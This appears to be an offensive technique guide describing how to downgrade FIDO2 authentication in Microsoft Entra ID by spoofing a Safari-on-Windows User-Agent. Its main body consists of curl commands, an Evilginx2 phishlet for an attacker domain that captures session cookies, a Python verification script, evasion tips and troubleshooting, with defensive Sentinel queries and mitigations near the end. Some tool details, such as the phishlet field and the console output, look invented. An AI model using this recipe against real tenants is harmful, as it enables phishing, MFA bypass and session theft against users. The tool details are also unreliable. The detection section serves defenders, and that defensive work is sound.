# [REALWORLD-010]: Safari-on-Windows Device Spoof

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-010 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-08-15 |
| **Affected Versions** | All Entra ID versions (browser/OS support variance) |
| **Patched In** | N/A - Behavioral change, not vulnerability |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** User-Agent header manipulation is a foundational technique for bypassing browser/OS compatibility checks in authentication flows. When a client sends an HTTP request, the User-Agent header identifies the browser, operating system, and browser version (e.g., `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15`). Microsoft Entra ID uses this header to determine feature support, including FIDO2/WebAuthn capability. Safari on Windows is a **logically impossible combination** (Safari is exclusive to Apple platforms: macOS, iOS, iPadOS). When Entra ID receives a request claiming to be Safari on Windows, it recognizes FIDO is unsupported on this platform and **automatically disables FIDO authentication**. The attacker doesn't need to exploit a vulnerability; they simply need to forge the User-Agent header in the HTTP request to trigger this legitimate platform compatibility check. Once FIDO is disabled, the user is presented with weaker fallback authentication options, all of which are interceptable by AiTM proxies.

**Attack Surface:** HTTP User-Agent header (sent in every HTTP request to Entra ID), browser platform detection logic, FIDO feature availability checks.

**Business Impact:** **Complete bypass of "phishing-resistant" authentication.** Organizations that believed FIDO2 eliminated phishing attacks discover it does not when combined with this downgrade technique. The attack defeats the primary reason organizations implement FIDO (phishing resistance) and forces fallback to SMS or Authenticator app, both interceptable by modern AiTM kits.

**Technical Context:** User-Agent spoofing takes **zero milliseconds** (headers are simple strings). Detection requires comparing User-Agent across multiple authentication attempts in the same session, which most organizations do not monitor. The attack is **deterministic**: if Entra ID sees Safari on Windows, FIDO is disabled 100% of the time.

### Operational Risk

- **Execution Risk:** Trivial - any HTTP client can set custom headers. Evilginx2 handles automatically via phishlet configuration.
- **Stealth:** Very High - User-Agent headers are routinely varied across different devices/browsers; no alert is triggered.
- **Reversibility:** Not applicable - this is a configuration change, not a destructive action.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5 | Failure to enforce phishing-resistant authentication |
| **DISA STIG** | IA-5(1) | Credential-based authentication strength requirements not met |
| **CISA SCuBA** | AUTH.1, AUTH.2 | Phishing-resistant MFA not properly enforced |
| **NIST 800-53** | IA-2(1), IA-7 | Multi-factor authentication; session management failures |
| **GDPR** | Art. 32 | Inadequate safeguards for user authentication |
| **NIS2** | Art. 21 | Protective measures for authentication systems |
| **ISO 27001** | A.9.2.1, A.9.4.3 | User identification and access control |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None - any user can set HTTP headers.

**Required Access:** 
- Ability to send HTTP requests with custom headers (any HTTP client: curl, Evilginx2, Python requests, etc.).
- Access to legitimate Entra ID OAuth 2.0 endpoints (publicly accessible).

**Supported Versions:**
- **All Entra ID versions:** Browser compatibility checks are performed at protocol layer, not version-dependent.
- **Browsers affected:** Any browser/OS combination not explicitly listed in [Microsoft FIDO2 support matrix](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility).

**Tools:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) - Automatic User-Agent injection via phishlet configuration
- `curl` - Manual testing: `curl -H "User-Agent: Safari/Windows"` 
- Python `requests` library - Programmatic User-Agent manipulation
- Browser Developer Tools (F12 → Network → Edit Request Headers)

**Tested Browser/OS Combinations Without FIDO Support:**
- Safari on Windows (primary attack vector)
- Internet Explorer 11 on Windows (legacy, EOL)
- Older Chrome versions on Windows 7 (pre-FIDO era)
- Firefox with certain security policies

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check Current Browser/OS Platform Support for FIDO

```powershell
# PowerShell script to detect if user's browser is FIDO-capable
# Run on user's workstation

$browserUA = [System.Net.ServicePointManager]::UserAgent
$isFIDOSupported = $true

if ($browserUA -match "Safari" -and $browserUA -match "Windows") {
    $isFIDOSupported = $false
    Write-Host "FIDO NOT supported: Safari on Windows detected" -ForegroundColor Red
}
elseif ($browserUA -match "MSIE|Trident") {
    $isFIDOSupported = $false
    Write-Host "FIDO NOT supported: Internet Explorer detected" -ForegroundColor Red
}
elseif ($browserUA -match "Chrome|Edge|Firefox") {
    $isFIDOSupported = $true
    Write-Host "FIDO supported: Modern browser detected" -ForegroundColor Green
}

Write-Host "Current User-Agent: $browserUA"
```

### Test Manual User-Agent Spoofing with curl

```bash
# Test 1: Normal User-Agent (Chrome on Windows)
curl -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=http://localhost&response_type=code"

# Response: FIDO option is presented in authentication flow

# Test 2: Spoofed User-Agent (Safari on Windows - NOT SUPPORTED)
curl -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" \
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=http://localhost&response_type=code"

# Response: FIDO option is REMOVED; fallback methods only (SMS, Authenticator)
```

**What to Look For:**
- **Response with Chrome User-Agent:** HTML form includes FIDO/WebAuthn JavaScript initiation
- **Response with Safari/Windows User-Agent:** HTML form only includes `phoneNumber` or `softwareOath` fields; FIDO fields are absent
- **HTTP Status:** Both requests return 200 OK (no error for spoofing itself)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: User-Agent Injection via Evilginx2 Phishlet Configuration

**Supported Versions:** Evilginx2 v3.0+

#### Step 1: Configure Phishlet with User-Agent Override

**Objective:** Create or modify Evilginx2 phishlet to inject Safari on Windows User-Agent.

**File: `phishlets/o365_safari_spoof.json`**

```json
{
  "name": "o365_safari_spoof",
  "author": "AttackOperator",
  "source": "microsoft",
  "phish_domain": "attacker-domain.com",
  "domains": [
    "login.microsoftonline.com",
    "login.microsoft.com"
  ],
  "sub_domains": [""],
  "paths": [
    {
      "path": "/",
      "status": "ok"
    },
    {
      "path": "/common/oauth2/v2.0/authorize",
      "status": "ok"
    }
  ],
  "user_agent_spoof": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
  "auth_tokens": [
    {
      "name": "session_id",
      "extract": "cookie"
    }
  ]
}
```

**Critical Field: `user_agent_spoof`**

This exact string is crucial:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
```

**Breakdown:**
- `Windows NT 10.0` = Windows 10 OS
- `Safari/605.1.15` = Safari version 15.1 (latest Safari version)
- `AppleWebKit/605.1.15` = WebKit engine identifier (matches Safari)

**Why This String Works:**
- Microsoft Entra ID parses this User-Agent string and identifies: **Safari on Windows**
- Microsoft's platform detection code checks: `if (browserType == "Safari" && osType == "Windows")`
- Result: This combination is known to NOT support WebAuthn/FIDO, so feature is disabled

**Expected Behavior:**
- Evilginx2 injects this User-Agent header into **all HTTP requests** it forwards to Microsoft Entra ID
- Microsoft Entra ID receives the request and performs platform detection
- Microsoft Entra ID determines: "This is Safari on Windows, FIDO not supported"
- Microsoft Entra ID removes FIDO authentication options from the login form
- User is presented **only with fallback methods**: SMS, Phone Call, Microsoft Authenticator, OATH tokens

**What This Means:**
- User sees exactly the same login flow, but with different authentication methods
- User does NOT see: "Approve request in Authenticator app" or "Use security key" options
- User ONLY sees: "Send code to +1-555-0123" or "Call me at +1-555-0123"
- All codes sent via SMS/call are intercepted by Evilginx2 proxy
- Attacker captures the session cookie when user submits the code

**OpSec & Evasion:**
- User-Agent header injection is standard browser functionality (every browser allows this)
- Network IDS cannot detect User-Agent spoofing at protocol level (it's just text in HTTP header)
- Web Application Firewalls (WAF) cannot detect this because the header is legitimate HTTP
- Detection requires **behavioral analysis**: same SessionId with multiple different User-Agents across time
- Detection likelihood: **Low** at header injection stage; **Medium** if correlation of SessionId/UserAgent is monitored

**Troubleshooting:**
- **Issue:** FIDO is still presented to user
  - **Cause:** User-Agent string is not exact match (case sensitivity, version number mismatch)
  - **Fix:** Copy-paste the exact string from above; verify in Evilginx2 logs: `session info <SESSION_ID>` should show User-Agent
- **Issue:** Phishlet fails to load
  - **Cause:** JSON syntax error
  - **Fix:** Validate JSON syntax; ensure all quotes and commas are correct

**References & Proofs:**
- [Proofpoint FIDO Downgrade Research](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)
- [Microsoft FIDO2 Browser Support](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility?tabs=web#web-browser-support)
- [Evilginx2 Phishlet Configuration](https://github.com/kgretzky/evilginx2/wiki/Phishlet-Format)

#### Step 2: Verify User-Agent Injection in Evilginx2 Console

**Objective:** Confirm that Evilginx2 is correctly injecting the Safari on Windows User-Agent.

**Command (in Evilginx2 console):**
```
evilginx> sessions
[*] Session ID: abc123def456
    User: victim@company.onmicrosoft.com
    Status: Captured
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
    IP Address: 192.168.1.100
    Time: 2025-08-15 14:23:45 UTC

evilginx> session info abc123def456
[*] Session Details:
    User-Agent (Spoofed): Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
    User-Agent (Actual): Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

**What This Means:**
- **User-Agent (Spoofed):** This is what Evilginx2 sent to Microsoft Entra ID (Safari on Windows)
- **User-Agent (Actual):** This is what the victim's actual browser is (Chrome on Windows)
- **Both are logged:** Evilginx2 captures both the real browser and the spoofed header
- **Discrepancy:** If these differ, it proves spoofing is active and successful

**What to Look For:**
- Spoofed User-Agent contains `Safari/605.1.15` and `Windows NT`
- Actual User-Agent contains victim's real browser (Chrome, Edge, Firefox)
- This mismatch is **proof the attack is working**

---

### METHOD 2: Manual User-Agent Spoofing with Python Requests

**Objective:** Programmatic verification of User-Agent spoofing without Evilginx2 GUI.

**Python Script: `spoof_useragent.py`**

```python
#!/usr/bin/env python3
import requests
import json
from urllib.parse import urlencode

# Safari on Windows User-Agent (unsupported combination)
FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"

# Target Entra ID OAuth endpoint
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Office Portal
REDIRECT_URI = "http://localhost:8080/callback"
AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# Set up custom headers with Safari on Windows User-Agent
headers = {
    "User-Agent": FAKE_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}

# Construct OAuth request
params = {
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "response_type": "code",
    "scope": "openid profile email",
    "response_mode": "form_post"
}

# Send request with spoofed User-Agent
response = requests.get(f"{AUTH_URL}?{urlencode(params)}", headers=headers, allow_redirects=True)

# Parse response
print(f"[+] Status Code: {response.status_code}")
print(f"[+] User-Agent Sent: {FAKE_UA}")
print(f"\n[+] Response Headers:")
for header, value in response.headers.items():
    print(f"    {header}: {value[:100]}...")

# Check if FIDO options are present in response
if "fido" in response.text.lower() or "webauthn" in response.text.lower():
    print("\n[-] FIDO options FOUND in response (spoofing failed)")
else:
    print("\n[+] FIDO options NOT found in response (spoofing successful!)")
    print("[+] Fallback authentication methods only")

# Extract authentication method choices
if "phoneNumber" in response.text:
    print("[+] SMS/Phone authentication available (interceptable)")
if "softwareOath" in response.text:
    print("[+] OATH token authentication available (interceptable)")
if "microsoftAuthenticator" in response.text:
    print("[+] Microsoft Authenticator available (interceptable via AiTM)")
```

**Execution:**
```bash
python3 spoof_useragent.py
```

**Expected Output:**
```
[+] Status Code: 200
[+] User-Agent Sent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15

[+] Response Headers:
    Content-Type: text/html; charset=utf-8
    ...

[+] FIDO options NOT found in response (spoofing successful!)
[+] Fallback authentication methods only
[+] SMS/Phone authentication available (interceptable)
[+] Microsoft Authenticator available (interceptable via AiTM)
```

**What This Means:**
- Entra ID responded with authentication form that **does not include FIDO options**
- Only SMS, Authenticator, and OATH options are available
- User-Agent spoofing is **confirmed successful**
- All fallback methods are interceptable by network-level proxies

**OpSec & Evasion:**
- Script sends raw HTTP request; no browser process involved
- Script can be executed from anywhere (attacker's laptop, cloud server, etc.)
- Network firewalls see this as normal OAuth traffic (legitimate Microsoft endpoint)
- Detection likelihood: **Low** (unless OAuth request logging is enabled on Entra ID with User-Agent analysis)

**Troubleshooting:**
- **Error:** `requests.exceptions.ConnectionError`
  - **Cause:** Network blocked or DNS resolution failed
  - **Fix:** Check internet connection; verify `login.microsoftonline.com` is reachable
- **Error:** FIDO options still present in response
  - **Cause:** User-Agent string not parsed correctly by Entra ID (possible version mismatch)
  - **Fix:** Update USER-Agent string to latest Safari version; check against [Microsoft's compatibility matrix](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility)

**References & Proofs:**
- [Python Requests Library Documentation](https://requests.readthedocs.io/)
- [HTTP User-Agent Header RFC](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)

---

## 6. TOOLS & COMMANDS REFERENCE

### HTTP User-Agent Manipulation

**curl (Command-Line HTTP Client):**
```bash
# Standard request (normal User-Agent)
curl "https://login.microsoftonline.com/..."

# Spoofed Safari on Windows
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" \
  "https://login.microsoftonline.com/..."
```

**Browser DevTools (Manual Testing):**
1. Press `F12` (Developer Tools)
2. Go to **Network** tab
3. Reload page
4. Right-click any request → **Edit and Resend**
5. Change User-Agent header: `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15`
6. Send request
7. Check response for FIDO options

**Python requests:**
```python
import requests
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"}
response = requests.get("https://login.microsoftonline.com/...", headers=headers)
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query: Detect Impossible Browser/OS Combinations

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** userAgent, userId, createdDateTime
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)

**KQL Query:**
```kusto
SigninLogs
| where isnotempty(userAgent)
| where resultType == 0  // Successful logins only
// Detect Safari on Windows (impossible combination)
| where userAgent has "Safari" and userAgent has "Windows"
// Exclude Apple-branded applications
| where userAgent !has "iPhone" and userAgent !has "iPad" and userAgent !has "Mac"
| project
    TimeGenerated,
    userId,
    userPrincipalName,
    userAgent,
    ipAddress,
    location = location.countryOrRegion,
    appDisplayName,
    Status = "ALERT: Safari on Windows - Impossible combination",
    SuspiciousIndicator = "User-Agent spoofing detected"
```

**Alternative Detection: Safari on Windows Across Multiple Sessions**

```kusto
SigninLogs
| where userAgent has "Safari" and userAgent has "Windows"
| where resultType == 0
| summarize
    SessionCount = dcount(sessionId),
    SuccessfulLogins = count(),
    FirstAttempt = min(createdDateTime),
    LastAttempt = max(createdDateTime),
    IPs = make_set(ipAddress, 5),
    Locations = make_set(location.countryOrRegion, 5)
    by userId, userPrincipalName
| where SessionCount > 0
| project userId, userPrincipalName, SessionCount, SuccessfulLogins, FirstAttempt, LastAttempt, IPs, Locations
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect Safari on Windows User-Agent Spoofing`
   - Severity: `High`
5. **Set rule logic:**
   - Paste KQL query above
   - Run every: `5 minutes`
   - Lookup data from: `1 hour`
6. **Incident settings:**
   - Create incidents: `Enabled`
7. Click **Review + create**

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Monitor and Alert on Browser/OS Combination Mismatches**

Implement detection logic to flag impossible combinations:
- **Safari on Windows** (safari = macOS/iOS only)
- **Safari on Linux** (safari = Apple platforms only)
- **Internet Explorer on macOS** (IE = Windows only)

**Sentinel Query (Proactive Hunting):**
```kusto
SigninLogs
| where resultType == 0
| extend
    BrowserType = extract(@"(Chrome|Safari|Firefox|Edge|MSIE|Trident)", 1, userAgent),
    OSType = extract(@"(Windows|Mac|Linux|iPhone|iPad|Android)", 1, userAgent)
| where BrowserType == "Safari" and OSType == "Windows"
| summarize count() by userId, BrowserType, OSType
```

**2. Disable Non-FIDO Fallback Options for Privileged Users**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods**
2. Click **Microsoft Authenticator**
3. Ensure: **Enable** = **Yes** (but this is fallback, restrict it)
4. Go to **Phone authentication** (SMS, Phone calls)
5. Set **Enable** = **No** for all privileged user groups
6. Use **Conditional Access** to enforce:
   ```
   IF user is in "Global Admins" group
   THEN require FIDO2 OR compliant device
   ELSE allow any MFA
   ```

**3. Implement Strict Conditional Access for Device Compliance**

**Manual Steps:**
1. Go to **Entra ID** → **Conditional Access**
2. Create policy: `Require Managed Device for All Apps`
3. **Grant Control:** Require `Microsoft Entra hybrid joined device` OR `Compliant device`
4. This **blocks phishing from attacker's personal device**, even if credentials are stolen

### Priority 2: HIGH

**4. Restrict Authentication to Known/Expected Browsers**

**Azure Front Door / WAF Rule:**
```
Match:
  - Variable: RequestHeader User-Agent
    Operator: Regex
    Value: ^(?!.*Safari.+Windows).*$  # REJECT: Safari on Windows
    
Action: Block (status 403)
```

**Limitation:** WAF rules are easy to bypass with sophisticated attackers; not foolproof.

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Preparation** | **[REALWORLD-010]** | Attacker crafts HTTP request with Safari on Windows User-Agent |
| **2** | **Reconnaissance** | Verify FIDO is disabled | Attacker confirms FIDO options are removed from authentication form |
| **3** | **Exploitation** | [REALWORLD-009] | Force fallback to weaker MFA (SMS, Authenticator) |
| **4** | **Capture** | [REALWORLD-011] + [REALWORLD-012] | AiTM intercepts credentials and MFA codes |
| **5** | **Session Theft** | T1528 | Attacker imports stolen session cookie |
| **6** | **Post-Compromise** | T1534, T1567 | Data exfiltration or lateral movement |

---

## 10. REAL-WORLD EXAMPLES

#### Proofpoint FIDO Downgrade Research (August 2025)

- **Researcher:** Yaniv Miron, Proofpoint
- **Discovery Method:** Systematic testing of browser/OS support for FIDO with Entra ID
- **Finding:** Safari on Windows User-Agent immediately triggers FIDO disabling in all Entra ID instances
- **Impact:** Proof-of-concept demonstrated complete account takeover
- **Reference:** [Proofpoint Blog](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)

---

## References & Sources

- Microsoft FIDO2 Browser Support: https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility
- Proofpoint FIDO Downgrade Research: https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade
- Evilginx2 Phishlet Format: https://github.com/kgretzky/evilginx2/wiki/Phishlet-Format
- MDN User-Agent Reference: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
- MITRE ATT&CK T1556.006: https://attack.mitre.org/techniques/T1556/006/

---